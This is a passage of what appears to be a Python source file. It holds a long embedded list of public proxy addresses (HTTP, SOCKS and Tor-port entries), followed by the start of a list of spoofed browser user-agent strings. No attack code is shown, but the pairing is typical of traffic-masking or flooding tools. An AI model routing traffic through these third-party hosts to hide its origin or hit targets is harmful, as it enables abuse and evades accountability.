79.127.56.147:8080
111.75.160.149:7302
203.194.111.112:6969
45.179.164.9:80
43.224.10.23:6667
128.199.205.203:54767
13.231.137.2:48540
179.189.193.89:3129
219.154.156.21:7302
201.234.67.107:999
61.153.62.163:7302
123.57.26.118:1080
140.227.212.136:3128
169.57.157.148:80
185.87.121.5:8975
39.108.137.229:1080
120.79.173.225:50000
103.141.12.161:1080
37.57.15.43:33761
112.30.142.66:7300
60.6.215.241:7302
181.129.183.19:53281
161.35.159.28:3128
42.248.76.37:8902
51.155.3.184:33427
93.105.40.62:41258
111.160.7.148:7302
35.220.137.177:30023
120.79.15.97:1080
153.36.232.210:7890
139.59.13.219:10004
5.183.103.132:14999
178.18.243.41:9050
95.67.16.153:8080
61.178.152.31:7302
125.75.127.215:1111
175.213.81.62:1080
27.150.27.133:10080
162.243.146.217:31178
8.136.137.129:8877
39.129.198.182:7302
119.29.221.234:8003
70.166.167.36:4145
161.35.179.193:60235
51.254.44.184:30006
36.89.229.97:59707
180.167.166.5:7302
79.143.180.109:63640
178.136.2.208:55443
212.95.180.50:53281
119.147.98.124:7302
103.142.108.145:8080
118.178.131.166:19080
104.168.87.16:1080
154.159.243.117:8080
120.24.66.188:1080
181.6.168.203:1080
158.69.64.142:9200
212.200.39.210:8080
125.46.19.107:7302
200.8.19.18:999
5.128.61.28:1080
43.241.29.201:8080
103.90.231.93:23295
205.196.220.122:4506
173.197.167.242:8080
218.6.53.247:7302
112.163.21.154:23386
223.100.29.20:7302
5.189.185.139:3128
138.197.208.39:9050
91.204.250.133:33427
183.47.10.3:7302
120.24.200.2:1080
164.132.95.241:20268
191.96.42.80:1080
184.178.172.18:15280
37.57.38.133:44299
121.4.103.166:7891
170.106.152.12:21127
119.187.123.130:7302
103.81.84.225:8088
67.201.33.10:25283
49.70.13.237:7082
159.203.70.88:9100
119.28.155.202:9999
120.77.139.249:1080
185.81.98.120:3128
49.128.206.143:57067
109.94.110.202:9050
117.159.198.122:7302
114.6.87.177:60811
177.101.55.34:9090
188.165.59.127:3128
104.168.162.207:10002
47.52.254.9:9100
192.111.138.29:4145
180.168.141.242:1080
206.62.64.34:8080
185.200.38.206:10820
103.153.76.236:4002
113.28.90.66:9480
120.79.130.147:1080
116.212.152.95:33427
177.185.32.1:8080
92.222.206.150:2020
39.108.171.159:1080
5.188.181.170:3080
81.163.53.118:41258
1.71.170.146:7302
218.58.137.22:7302
197.246.212.70:3030
78.111.97.182:3142
201.238.242.38:999
183.62.58.98:7300
59.94.96.16:5678
167.71.214.4:45062
166.62.32.44:8181
111.38.166.251:7302
174.64.199.79:4145
121.235.209.219:8902
192.3.116.131:6789
120.24.176.9:1080
193.34.21.4:55277
120.24.72.243:1080
45.207.36.100:1080
159.89.167.209:47202
39.108.64.172:1080
183.129.157.62:7302
107.21.38.230:9050
207.180.240.119:1080
167.71.92.197:55443
154.239.6.163:50800
43.135.74.226:38081
60.12.79.187:7302
36.112.209.171:7302
12.90.37.182:8181
176.110.2.15:8080
91.121.210.56:10087
42.248.125.203:8902
115.159.65.66:7302
112.78.170.250:8080
140.227.239.34:3128
67.210.146.50:11080
184.178.172.25:15291
183.134.199.108:7302
45.161.115.145:999
5.11.17.230:1080
120.224.124.14:7891
131.161.60.25:8083
49.51.69.212:21127
47.106.180.67:1080
185.189.199.75:23500
35.223.114.70:3127
120.24.189.101:1080
184.181.217.210:4145
82.99.232.18:58689
54.37.160.93:1080
171.237.205.83:1080
63.250.32.245:19542
122.224.56.198:7302
122.226.224.166:7302
47.245.56.108:18181
165.227.104.122:5743
104.168.12.190:5555
183.173.23.100:7890
103.216.82.20:6667
91.198.137.31:3513
120.24.187.149:1080
202.62.48.5:33427
221.12.145.70:7302
45.32.171.166:9050
153.3.250.242:33080
20.94.230.158:80
47.106.122.110:1080
187.94.209.246:3128
82.156.114.119:8003
185.207.205.134:8001
36.138.93.224:81
117.84.156.254:8902
194.87.102.102:1111
183.230.141.185:7302
61.188.186.157:7302
140.227.228.30:3128
176.9.65.8:38460
113.231.68.139:7302
41.65.174.120:1981
117.86.175.109:20008
43.249.224.172:83
60.10.37.21:7302
104.255.170.67:50503
37.131.202.95:33427
117.158.175.21:7302
103.230.212.21:7302
139.162.241.44:64198
192.252.209.155:14455
184.185.2.190:4145
185.154.72.177:41080
221.158.143.58:5001
103.73.75.33:1080
1.196.217.57:7302
183.215.125.101:7302
104.131.65.115:1337
142.4.21.35:35181
176.115.197.118:8080
104.255.170.64:56541
152.70.246.237:40009
98.178.72.21:10919
216.245.192.130:46539
181.204.104.74:8080
190.248.153.162:8080
220.169.127.176:7302
222.175.107.206:7302
212.129.35.138:18703
119.40.83.138:8080
116.212.142.204:33427
204.44.94.93:32661
77.43.86.211:8080
180.124.154.61:8902
192.140.91.133:50701
123.56.115.59:1080
120.24.174.98:1080
115.239.234.43:7302
178.62.22.215:28383
219.131.62.67:7302
103.146.185.105:3127
111.53.120.154:7300
111.20.239.188:7302
192.111.139.165:4145
103.248.93.5:8080
113.107.139.199:7302
98.162.25.4:31654
111.193.116.172:1080
152.231.25.126:8080
122.228.145.126:7302
125.141.139.60:5566
106.15.180.114:8003
82.114.106.40:1256
222.240.80.227:7302
109.95.32.145:8080
105.235.222.2:8080
93.145.17.218:8080
104.236.78.102:3128
111.43.105.154:7302
177.128.115.229:999
120.24.244.187:1080
187.1.57.206:20183
150.129.52.74:6667
5.188.136.52:8080
190.71.27.179:999
61.134.53.124:7302
8.210.48.101:17194
194.60.87.97:19047
218.93.207.213:7890
169.57.157.148:25
120.78.69.103:1080
88.255.185.229:8080
95.216.243.188:1020
101.74.239.6:1111
220.171.121.3:7302
42.248.127.67:8902
91.237.84.152:8080
216.245.192.130:3938
188.166.104.152:20643
123.18.206.50:1080
119.167.81.238:7302
190.109.168.217:8080
167.99.239.113:47430
184.178.172.13:15311
103.73.74.181:1080
59.62.245.222:20007
178.62.32.105:25292
161.97.179.49:3128
107.170.50.49:36827
176.117.237.132:1080
218.207.218.21:7302
45.7.177.237:34234
212.47.238.228:8118
47.106.224.118:1080
124.114.234.171:7302
8.210.48.101:18474
46.98.251.182:8081
117.178.233.74:7302
45.169.16.1:8080
85.235.184.186:3129
45.67.229.104:30003
192.163.252.85:52119
144.91.104.118:38080
37.29.80.161:8080
72.221.232.155:4145
103.75.184.126:38556
122.155.165.191:3128
111.1.91.177:7302
20.210.80.237:1080
184.178.172.14:4145
13.125.211.66:443
200.25.254.193:54240
165.22.214.24:28704
159.8.114.34:8123
47.109.40.23:1080
124.227.14.147:7302
190.131.250.105:999
216.245.212.166:44518
201.249.161.51:999
111.38.9.49:7300
94.130.244.179:5566
198.8.94.170:39074
129.21.49.147:9050
120.24.176.20:1080
122.193.18.134:7302
115.127.162.234:8080
85.25.100.47:5577
212.174.11.120:9090
140.83.63.8:9050
101.33.117.230:40532
112.30.60.236:22222
103.73.74.178:1080
58.97.72.83:8080
222.248.219.213:1111
59.49.96.190:7302
42.248.121.149:8902
121.34.248.21:7302
180.167.161.166:7302
120.25.167.180:1080
185.251.45.174:1080
157.230.13.52:55904
115.238.99.174:7302
185.108.141.74:8080
36.32.191.51:7302
180.211.193.130:3127
81.143.236.200:443
37.152.187.170:9090
114.231.198.35:20001
36.66.103.211:3128
128.199.196.151:443
98.162.25.29:31679
117.156.53.26:7300
45.181.121.73:999
72.221.196.157:35904
116.80.49.253:3128
95.167.29.50:8080
204.195.136.34:80
123.119.161.204:10800
122.226.168.18:7302
173.248.248.90:8080
203.189.89.153:8080
39.108.6.90:1080
218.87.108.231:7300
185.200.37.118:10820
1.180.0.162:7302
122.13.77.173:53333
221.2.74.130:1085
5.149.219.201:8080
218.76.202.167:7302
165.192.76.147:1080
98.175.31.195:4145
47.106.156.15:1080
58.37.105.184:7891
114.234.30.173:8902
103.69.38.64:8080
122.9.162.243:1080
61.178.99.43:7302
193.138.247.36:3128
85.236.190.201:1080
212.8.246.207:13896
139.226.74.3:1088
164.70.117.141:3128
120.24.174.94:1080
173.82.202.224:11028
167.114.89.174:37666
104.236.45.251:1089
148.251.249.251:8080
216.245.192.130:15768
104.128.72.23:8951
69.61.200.104:36181
223.8.122.132:7302
173.82.252.159:22318
221.218.245.146:7302
112.105.12.67:1111
182.151.212.156:7300
179.61.111.226:999
110.191.237.91:7302
50.232.250.157:8080
192.111.139.162:4145
197.232.65.40:55443
138.201.107.232:9050
94.130.72.121:10005
113.28.90.67:9480
103.135.220.91:80
220.179.50.121:7302
85.234.126.107:55555
133.167.121.133:1976
119.82.245.101:6060
42.248.120.42:8902
118.123.241.64:10808
80.234.30.36:1080
223.99.199.173:7302
103.153.190.78:8081
188.25.15.193:9050
190.120.251.26:999
181.78.21.174:999
218.28.136.54:7302
103.57.222.220:39704
120.78.185.215:1080
180.124.155.200:8902
47.104.16.8:6667
47.107.94.85:1080
221.207.6.100:7302
137.74.61.115:9100
120.78.94.148:1080
113.204.236.42:7302
112.74.162.146:1080
190.217.14.110:999
220.165.182.218:7302
177.93.33.246:999
95.216.181.107:9070
46.28.108.131:48113
192.111.135.17:18302
58.248.89.3:1080
122.248.197.121:9050
72.217.216.239:4145
103.16.60.22:50000
121.37.168.247:1080
196.216.65.57:8080
101.33.253.76:7890
123.150.95.142:7302
50.233.228.147:8080
111.203.10.200:7302
193.142.146.157:9150
146.56.172.230:1080
203.189.89.158:8080
139.198.30.210:3128
185.134.96.34:8081
60.174.197.51:7302
116.80.58.110:3128
120.24.70.241:1080
202.105.238.173:7302
122.193.18.135:7302
113.124.220.240:8902
206.189.118.100:18938
45.119.82.33:48464
183.81.156.131:8080
80.191.164.173:6565
120.196.228.73:1081
222.243.158.54:7302
103.90.231.93:17617
8.130.161.231:7891
112.27.59.234:7302
165.154.61.24:3512
146.56.138.232:35362
120.24.193.93:1080
67.201.33.9:25280
96.9.92.227:33427
169.57.157.146:8123
181.205.41.210:7654
66.135.227.181:4145
120.24.85.197:1080
60.10.10.171:7302
113.121.40.228:8902
159.75.76.5:9090
167.71.5.83:1080
72.206.181.103:4145
218.207.218.19:7302
43.154.57.108:9961
116.235.89.90:1080
62.113.115.94:16072
223.212.194.127:8090
60.255.137.42:7302
184.178.172.5:15303
67.205.191.23:18474
111.22.216.141:7302
222.212.85.16:7000
47.115.16.168:1080
120.33.27.218:7302
210.16.73.85:1080
158.58.135.23:33427
39.119.103.113:40086
125.25.206.28:8080
222.180.25.132:7302
101.200.137.28:8902
176.214.97.13:8081
8.242.142.182:999
219.146.197.174:7302
116.73.14.16:8080
167.99.62.42:42688
20.105.253.176:8080
174.77.111.196:4145
91.206.148.243:61410
61.90.185.171:7302
103.250.158.21:6667
120.24.193.153:1080
218.149.25.193:1111
120.24.194.16:1080
195.177.217.131:60613
27.116.51.178:6667
116.80.84.159:3128
103.242.175.214:57081
39.108.72.165:1080
206.189.92.74:7777
36.89.86.49:56845
192.252.208.67:14287
181.3.48.176:1080
5.188.211.50:7777
110.77.134.106:8080
114.6.88.238:60811
46.101.103.161:25799
113.108.247.146:20086
190.124.30.43:999
185.125.252.241:1080
182.160.124.26:8081
112.5.72.213:7302
47.106.129.66:1080
112.53.83.102:1080
112.124.27.159:4406
186.103.234.75:999
159.8.114.37:25
179.118.198.20:3128
41.79.9.246:8080
195.175.67.202:1080
103.78.171.10:83
181.225.54.59:6969
61.191.144.18:7300
119.81.189.194:25
221.11.48.82:7302
1.20.217.52:8080
118.122.250.27:7302
47.115.10.253:1080
84.238.219.216:33427
91.121.6.84:2114
219.138.174.6:7302
60.191.24.52:7302
185.243.56.207:14999
23.224.20.134:8080
47.96.102.110:1080
164.70.116.39:3128
104.168.214.225:26047
84.10.217.121:3333
91.150.67.17:8080
198.1.94.46:15456
43.224.10.22:6666
61.180.29.15:20003
218.89.37.196:7302
223.112.183.58:7302
213.32.62.216:1080
122.193.18.156:7302
46.36.89.27:33427
159.8.114.37:80
191.96.231.98:3128
111.47.10.107:7302
112.49.16.32:7302
61.175.213.190:7302
15.164.219.8:8118
5.141.244.97:61288
122.194.205.43:7302
89.19.115.55:6655
36.91.149.59:8080
104.168.169.132:10003
98.162.96.52:4145
222.223.103.232:7302
58.221.135.158:7302
120.76.75.159:1080
185.234.72.65:9050
202.62.84.210:53281
120.76.128.31:1080
120.24.193.203:1080
41.65.36.166:1981
39.108.0.1:1080
202.105.189.58:7302
152.67.202.0:1080
45.248.9.137:8003
45.55.112.168:51800
212.46.230.102:6969
58.48.122.170:7302
98.162.25.7:31653
120.24.7.141:1080
138.68.51.109:9050
223.100.241.162:7302
111.172.65.190:1081
45.181.122.9:999
118.122.144.92:7302
95.78.174.235:8080
114.99.47.150:7302
184.178.172.28:15294
194.180.174.81:10523
113.124.218.124:8902
47.243.238.186:9090
205.185.117.77:16831
198.8.94.170:4145
202.180.19.173:1080
180.76.250.195:1080
131.72.69.98:45005
103.117.194.166:8080
139.5.151.179:63123
66.42.224.229:41679
24.249.199.4:4145
72.210.252.134:46164
62.112.118.14:8080
5.189.184.146:61424
178.217.140.70:443
192.169.139.161:8975
218.65.221.24:7302
175.184.231.178:8080
124.113.224.245:7302
35.223.101.235:9050
45.113.80.37:9050
123.178.142.222:7302
183.131.85.16:7302
185.204.197.169:8080
211.93.2.190:7302
8.210.48.101:18489
23.95.137.162:9050
43.224.8.116:6667
188.136.216.201:9080
201.91.82.155:3128
103.19.130.50:8080
34.134.60.185:443
198.12.121.71:38007
45.56.84.125:80
116.202.30.183:51105
34.132.61.61:3127
218.6.152.149:7300
165.154.75.108:3512
39.96.175.55:1080
68.71.249.153:48606
185.58.224.205:8081
192.241.135.228:9050
120.24.179.68:1080
174.64.199.82:4145
45.127.246.98:8080
218.64.122.99:7302
176.74.9.62:8080
46.35.249.189:41419
120.79.223.240:1080
120.24.192.51:1080
209.141.37.57:5555
78.30.198.160:8080
200.155.139.242:3128
91.222.19.177:41890
58.48.84.30:7302
120.24.202.189:1080
183.220.253.178:7302
120.24.79.127:1080
72.221.164.34:60671
137.184.57.65:9050
154.236.168.181:1976
112.122.189.125:7300
161.202.226.194:80
95.213.154.54:31337
203.170.222.4:8080
222.187.74.246:8902
46.149.48.44:1000
42.248.122.198:8902
88.198.24.108:1080
223.27.194.66:80
43.155.92.192:59394
140.227.229.54:3128
142.44.136.97:7001
112.133.215.24:8080
80.82.55.71:80
120.24.88.50:1080
72.223.168.73:57494
120.71.148.202:8901
47.89.153.213:80
198.55.106.182:10086
103.120.133.178:33427
8.136.159.152:8877
104.131.8.62:19709
92.38.163.160:48484
43.129.222.186:38080
183.250.109.213:7302
113.160.188.21:1080
138.68.6.227:9071
110.49.11.50:8080
120.79.43.42:1080
60.12.77.163:7302
102.222.252.6:9050
155.94.128.90:1080
60.215.109.34:7302
123.231.221.178:8080
59.175.146.43:7302
118.67.219.153:8080
67.55.186.162:8080
85.25.91.141:5577
111.33.92.16:7302
183.3.149.98:7302
41.65.193.100:1976
129.154.54.92:9999
140.227.211.115:3128
3.113.19.41:48540
23.254.209.129:24825
36.27.223.80:22036
120.24.59.25:1080
59.45.209.158:7302
161.202.226.194:8123
51.254.16.102:56148
194.44.104.242:31280
66.211.155.34:8080
212.180.252.34:8181
121.88.250.73:3128
150.230.45.220:8080
198.55.106.113:9055
112.31.106.108:31280
117.157.67.56:7302
42.248.122.220:8902
119.81.189.194:80
165.154.92.12:3512
159.192.104.53:8080
27.74.10.157:5018
201.220.102.146:8080
120.24.174.223:1080
47.106.83.26:1080
14.207.144.47:9080
115.42.212.101:7302
121.232.66.180:20007
43.129.220.105:3001
46.36.72.61:33427
218.201.172.7:8003
184.179.216.130:4145
213.216.67.190:8080
195.170.38.230:8080
45.67.231.58:9050
3.22.167.115:48540
61.191.144.18:7302
220.160.67.1:7302
160.19.240.58:8080
113.57.85.34:7302
59.51.87.27:7302
49.128.199.150:57541
47.75.96.111:10005
45.61.164.221:11411
218.68.0.154:7302
195.158.197.13:1043
60.12.109.74:7302
47.112.159.136:1080
218.75.216.18:7302
176.9.75.42:1080
61.178.172.95:7300
91.206.92.92:80
103.253.145.219:62162
142.93.137.235:47896
72.195.114.184:4145
103.216.82.19:6667
185.87.121.35:8975
202.40.188.94:40486
191.97.6.213:999
125.141.139.112:5566
103.138.41.132:8080
110.83.222.158:7302
45.169.148.11:999
120.76.247.227:1080
222.175.22.198:7302
125.75.127.191:1111
203.163.208.201:8080
122.193.18.136:7302
82.99.204.198:1080
200.0.40.134:8080
128.199.109.51:50877
49.128.218.142:47053
162.144.105.149:44316
103.81.214.254:82
103.242.175.115:1080
45.181.226.137:999
116.1.201.199:7302
120.79.97.105:1080
134.119.206.110:1080
110.78.28.94:8080
152.231.27.33:60080
120.24.200.122:1080
109.86.182.203:3128
157.245.42.58:53749
59.66.17.14:7890
51.15.122.235:9050
117.62.165.54:7891
91.198.137.31:3594
70.166.167.38:57728
152.32.185.145:1080
61.182.226.246:9999
111.41.48.161:7302
203.190.149.143:1080
46.21.248.155:9100
5.183.101.106:14999
218.205.124.53:7302
120.24.188.83:1080
62.152.75.110:50287
120.24.194.86:1080
113.247.221.4:7302
203.150.172.151:8080
159.8.114.34:25
217.66.178.107:2235
192.169.250.203:17296
85.25.118.155:5577
185.239.56.249:8083
197.254.97.248:80
103.21.163.70:6666
117.54.114.33:80
134.209.216.204:3130
116.204.248.239:80
34.146.157.204:9090
185.104.252.10:9090
110.74.199.16:63141
203.193.131.74:3128
88.87.92.147:8118
12.218.209.130:53281
85.25.99.106:5566
185.56.209.114:52342
129.226.125.228:31100
185.20.198.210:22800
50.24.123.86:8118
200.105.215.18:33630
140.227.212.136:3128
47.88.15.217:80
20.103.139.62:3128
45.79.230.234:80
91.107.6.115:53281
103.59.176.154:8080
103.80.1.2:80
41.128.148.73:1981
64.185.0.17:8080
181.209.158.178:80
45.236.170.181:999
35.187.224.178:3128
103.135.220.92:8080
202.164.39.147:3128
67.55.186.162:8080
154.113.119.50:8080
190.119.195.34:8080
181.40.90.26:999
103.174.4.116:8080
91.202.129.91:8080
154.236.162.41:1981
103.100.84.20:8080
45.227.250.192:9292
189.11.248.162:8080
161.22.34.119:8080
45.169.16.3:8080
191.7.216.250:8080
201.182.242.230:999
212.33.239.50:61309
109.200.159.28:8080
163.53.209.7:6666
185.58.16.127:8080
186.67.26.181:999
190.110.111.153:999
190.110.111.154:999
45.161.115.252:999
45.161.115.48:999
170.80.202.129:999
167.249.31.104:999
3.12.158.241:80
45.181.226.162:999
181.224.162.195:999
144.48.178.241:83
116.197.154.65:8080
103.159.46.121:83
107.151.182.254:80
23.239.20.205:80
77.238.129.14:55443
103.92.114.2:80
110.165.23.162:80
123.231.238.221:80
121.1.41.162:111
154.236.177.100:1981
20.105.253.176:8080
206.253.164.28:80
198.11.173.185:80
37.120.194.221:8081
8.214.7.15:80
45.184.155.254:6969
161.117.87.150:80
113.177.127.28:8118
206.253.164.101:80
139.162.78.109:3128
47.88.10.210:80
198.11.183.14:80
134.119.206.109:1080
103.107.92.1:52827
37.1.41.35:53281
213.135.118.150:3128
182.53.231.229:8080
200.37.140.34:10101
5.149.219.201:8080
144.217.75.65:8800
123.231.221.242:6969
185.202.165.1:53281
91.210.171.4:3128
177.184.182.244:3128
158.69.72.138:9300
46.0.203.186:8080
178.134.155.82:48146
133.167.65.45:8080
43.231.21.176:36415
200.25.254.193:54240
66.94.120.161:443
146.120.175.253:8181
23.224.128.101:59394
167.172.173.210:35863
140.227.210.163:3128
186.103.179.50:60080
116.80.70.3:3128
181.224.204.22:22800
186.219.96.47:54570
90.64.242.20:3128
150.129.201.30:6666
94.228.192.197:8087
65.21.111.230:5566
103.149.162.194:80
181.129.52.155:42648
223.29.199.144:55443
103.241.248.233:8000
167.71.199.228:8080
144.91.104.118:7777
115.241.197.126:80
35.152.75.76:8181
175.144.112.236:80
182.73.66.181:80
206.253.164.108:80
175.144.112.239:80
155.138.150.199:23456
37.26.86.206:47464
47.243.135.104:8080
206.253.164.198:80
50.7.250.51:80
177.54.226.50:60080
80.109.233.73:8118
103.73.194.2:80
103.117.101.70:80
189.84.159.119:80
177.86.201.22:8080
206.253.164.120:80
206.253.164.110:80
85.198.185.26:8080
67.205.128.38:3128
170.238.161.192:666
105.112.84.117:8080
96.2.228.18:8080
103.142.108.145:8080
191.97.17.67:999
190.226.32.218:8090
103.207.3.6:84
193.150.117.102:8000
45.188.105.54:8083
206.62.64.34:8080
23.140.80.52:8080
103.100.84.25:8080
185.82.96.22:9091
185.82.98.249:9091
194.126.8.90:80
165.16.5.105:1981
116.251.216.95:80
184.155.36.194:8080
139.5.71.46:23500
213.230.127.141:3128
5.133.24.132:8080
150.242.182.98:80
185.61.152.137:8080
20.47.108.204:8888
213.226.11.149:41878
190.220.1.173:56974
103.148.72.192:80
209.141.55.228:80
206.253.164.122:80
136.232.116.2:48976
201.219.194.180:9080
222.252.10.225:4003
20.94.230.158:80
45.70.198.195:999
95.137.240.30:60030
176.197.95.2:3128
205.185.122.11:80
119.81.189.194:80
161.117.85.96:80
209.141.35.151:80
47.245.12.42:80
8.210.83.33:80
140.227.203.41:3128
31.173.94.93:43539
140.227.213.98:3128
190.152.17.51:9812
185.118.130.34:8080
194.44.104.242:31280
152.228.128.48:8118
101.53.154.137:2008
212.46.230.102:6969
85.25.133.28:5566
190.131.250.105:999
41.60.234.180:8080
79.142.95.90:55443
93.180.221.205:8080
140.227.229.54:3128
93.117.72.27:43631
41.191.226.86:55443
103.251.225.16:6666
147.234.85.254:14507
186.125.59.8:46316
74.84.144.135:80
181.129.52.157:42648
113.160.37.152:53281
124.158.88.56:54555
200.164.65.81:55443
117.2.28.235:55443
134.122.26.172:3128
202.43.72.203:8080
176.56.107.248:44887
5.189.184.6:80
146.185.210.69:8118
103.1.93.184:55443
91.193.253.188:23500
47.74.226.8:5001
158.69.67.129:5566
85.25.4.28:5566
140.227.199.210:3128
196.3.97.71:23500
103.21.163.76:6666
80.249.94.220:55443
51.159.3.223:443
202.69.45.22:8080
101.109.255.17:43501
83.151.2.50:3128
144.217.240.185:9300
103.172.70.33:8080
85.25.117.134:5566
85.25.4.27:5566
201.99.66.9:8081
118.185.38.153:35101
116.80.84.159:3128
150.129.148.88:35101
46.151.145.4:53281
165.154.92.146:8888
46.229.187.169:53281
140.227.211.115:3128
85.25.108.234:5566
66.94.97.238:443
185.136.103.228:80
47.75.90.57:80
47.241.72.41:80
47.245.11.194:80
191.96.42.80:8080
161.35.70.249:3128
181.191.140.222:999
45.156.31.16:9090
45.189.253.74:999
103.88.170.82:8085
41.78.186.182:3128
85.114.112.22:8080
194.5.193.183:80
88.198.50.103:8080
150.109.32.166:80
41.78.186.181:3128
171.235.174.87:4001
199.19.225.250:80
199.19.224.3:80
149.19.224.37:3128
205.201.49.131:53281
180.94.69.66:8080
223.171.84.181:8000
140.227.239.34:3128
5.58.33.187:55507
74.143.245.221:80
140.238.42.240:3128
138.68.60.8:8080
81.24.117.250:18080
164.70.68.139:3128
91.225.226.39:44388
179.118.198.20:3128
116.68.161.54:55443
93.99.12.253:8080
182.160.124.26:8081
99.71.86.199:8118
89.171.41.90:6969
85.25.119.98:5566
49.156.47.162:8080
54.37.160.93:1080
103.241.227.110:6666
173.248.248.90:8080
85.25.208.198:5566
147.135.134.57:5566
103.250.156.24:6666
185.101.97.24:8118
95.216.247.69:40042
89.189.181.161:55855
116.197.128.106:8080
43.224.10.35:6666
212.129.15.88:8080
62.240.163.2:8080
85.187.184.129:8080
103.215.72.115:55443
45.154.244.174:8212
23.108.43.53:8118
23.108.43.123:8118
23.108.42.251:8118
23.108.42.70:8118
174.77.111.197:4145
184.178.172.18:15280
184.181.217.210:4145
192.111.130.5:17002
184.178.172.14:4145
184.178.172.25:15291
24.249.199.4:4145
72.206.181.105:64935
70.185.68.133:4145
72.221.172.203:4145
72.195.114.169:4145
70.166.167.38:57728
72.217.216.239:4145
70.166.167.55:57745
184.178.172.28:15294
192.252.211.197:14921
72.195.34.59:4145
72.223.168.86:57481
70.185.68.155:4145
72.195.114.184:4145
98.188.47.150:4145
72.210.252.134:46164
72.221.196.157:35904
72.223.168.73:57494
72.195.34.42:4145
72.221.232.155:4145
72.210.252.137:4145
98.170.57.231:4145
72.221.164.34:60671
98.162.25.7:31653
98.162.25.23:4145
98.162.96.53:10663
98.162.96.41:4145
98.178.72.21:10919
195.158.197.13:1043
192.111.138.29:4145
72.195.34.58:4145
98.188.47.132:4145
174.77.111.196:4145
113.160.188.21:1080
72.206.181.123:4145
192.111.139.163:19404
72.221.196.145:4145
192.111.137.37:18762
184.178.172.13:15311
174.64.199.82:4145
72.195.34.41:4145
72.210.208.101:4145
184.179.216.133:24630
67.201.33.10:25283
98.162.96.52:4145
184.178.172.5:15303
192.111.139.162:4145
47.119.167.255:7891
192.252.209.155:14455
72.206.181.103:4145
72.223.168.67:4145
69.61.200.104:36181
192.111.135.21:4145
184.179.216.130:4145
208.102.51.6:58208
192.252.214.20:15864
174.75.211.222:4145
198.8.94.170:39074
195.175.67.202:1080
70.166.167.36:4145
98.171.154.23:4145
192.111.129.145:16894
66.42.224.229:41679
192.111.137.35:4145
158.69.64.142:9200
192.252.215.5:16137
211.136.100.154:7302
193.37.152.92:3128
221.214.109.166:7302
165.227.104.122:45119
192.252.208.70:14282
61.130.151.230:7302
46.0.234.11:5678
110.164.59.101:8080
193.203.61.35:8443
119.3.231.232:8001
120.77.12.33:1080
154.17.0.225:1080
72.206.181.105:64935
43.224.10.43:6666
79.122.225.167:8080
164.70.68.139:3128
203.86.236.148:3128
103.99.8.106:84
222.83.251.180:7302
190.60.104.218:3128
14.136.204.35:1088
124.161.103.80:7300
113.121.41.26:8902
104.131.8.62:10808
169.57.157.148:8123
179.49.161.58:999
61.160.93.54:7302
45.142.214.123:30002
222.217.240.207:7302
101.36.117.110:5555
128.199.193.214:8888
122.193.18.145:7302
98.162.25.23:4145
223.244.237.126:7300
111.21.186.98:7302
159.69.112.218:8888
221.214.218.105:7302
43.249.224.170:83
192.111.129.150:4145
208.52.137.150:5555
152.32.201.77:443
112.17.105.8:7300
72.195.34.58:4145
47.106.20.55:1080
159.65.24.24:9050
60.28.57.177:7302
23.94.149.131:53335
47.119.156.26:1080
125.123.44.195:10800
34.95.224.52:443
213.32.75.88:9300
120.24.185.143:1080
120.79.60.12:1080
58.216.159.46:7302
173.196.205.170:8080
116.48.133.94:40086
120.79.7.11:1080
54.37.160.88:1080
45.182.190.146:999
173.212.248.58:32077
204.199.67.174:999
39.129.178.13:7302
117.187.234.218:7302
134.122.102.103:8118
85.25.198.22:5577
95.0.219.234:8080
121.37.26.217:1080
103.102.193.242:7302
103.141.12.190:1080
180.168.152.206:7302
79.143.30.163:55418
158.69.225.124:2021
124.71.153.134:8901
128.199.202.122:1080
85.25.4.28:5566
61.178.88.109:7302
151.237.60.43:33427
150.109.148.234:1234
118.40.25.195:5003
93.190.141.62:9050
149.202.184.186:3128
138.68.60.8:1080
157.230.177.3:999
195.178.56.37:8080
47.57.184.90:28388
222.87.37.54:7302
3.144.99.13:38800
111.43.107.136:7302
192.111.137.34:18765
117.178.233.75:7302
101.71.154.251:1080
112.31.106.108:23456
119.23.44.204:1080
221.10.195.67:7302
39.152.112.207:7300
170.79.235.3:999
119.23.51.197:1080
219.135.149.68:7302
144.76.224.49:63640
138.68.57.62:9050
120.78.221.31:1080
221.211.62.4:1111
77.238.79.111:8080
95.215.48.93:8080
140.83.36.83:1000
167.99.12.224:22564
77.50.104.110:3128
183.250.154.92:7302
182.160.108.188:8090
5.58.178.99:41890
31.128.248.1:1080
103.243.114.206:8080
218.56.102.10:7302
120.25.105.219:1080
192.111.130.2:4145
114.243.173.98:1080
223.99.172.44:7302
114.132.220.223:10808
129.146.229.159:20000
94.74.132.129:808
183.236.245.246:7302
81.24.117.250:18080
39.104.129.141:7302
114.235.107.225:8902
210.12.172.12:7300
43.224.10.27:6667
173.82.119.12:11623
221.195.143.239:7300
195.90.201.165:9894
77.236.243.39:1256
120.24.193.206:1080
120.24.201.9:1080
45.76.174.167:31500
176.67.0.242:8080
119.29.48.249:8888
62.27.108.174:8080
51.38.125.228:42977
74.143.245.221:80
8.242.207.202:8080
43.154.143.161:9090
39.153.193.158:7302
181.48.23.250:8080
51.81.197.85:9050
51.15.228.227:3128
8.210.48.101:18193
120.79.53.184:1080
120.24.194.11:1080
91.207.238.107:56288
47.242.230.213:12345
188.165.254.122:9420"""
]
mozila = [
     'Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1', 'Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1', 'Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0',
     'Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1',
     'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2',
     'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
     'Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
     'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1',
